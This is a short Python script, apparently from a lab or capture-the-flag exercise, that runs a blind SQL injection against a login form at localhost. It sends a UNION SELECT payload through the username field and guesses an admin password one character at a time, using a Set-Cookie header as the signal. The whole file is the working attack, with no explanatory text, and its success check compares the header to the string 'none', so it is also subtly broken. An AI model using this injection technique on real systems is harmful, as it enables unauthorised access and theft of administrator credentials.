import requests

def payLoadStart(q): 
    payload  = {'username': "' UNION SELECT  'pass' AS password  FROM admins WHERE password LIKE '" + q +"____%' LIMIT 1 #", 'password': 'pass'}

    res = requests.post('http://localhost/user/login',  data=payload )
 
    #print(res.status_code)
    #return(res.headers['Content-Type'])
    r = res.headers
    return r


car = [ "a", "b","c", "d", "e", "f", "g", "h","i","j","k","l","m","n","o","p", "q","r", "s","t","u","v","w","x","y","z"]
numbers =["1", "2","3","4","5","6","7","8","9","0"]
simb =["!","@","#","$","¨","&","*","(",")","[","]"]
  
payload  = car + numbers + simb

for p in payload:  
         
         
        resp =payLoadStart(p)
        print("________________________________")
        if(resp.get('Set-Cookie') != "none"): 
            print(resp.get('Set-Cookie'))  
            print("Letra = " + p)  
        else: 
            print("AVISO")
        print("________________________________")

#        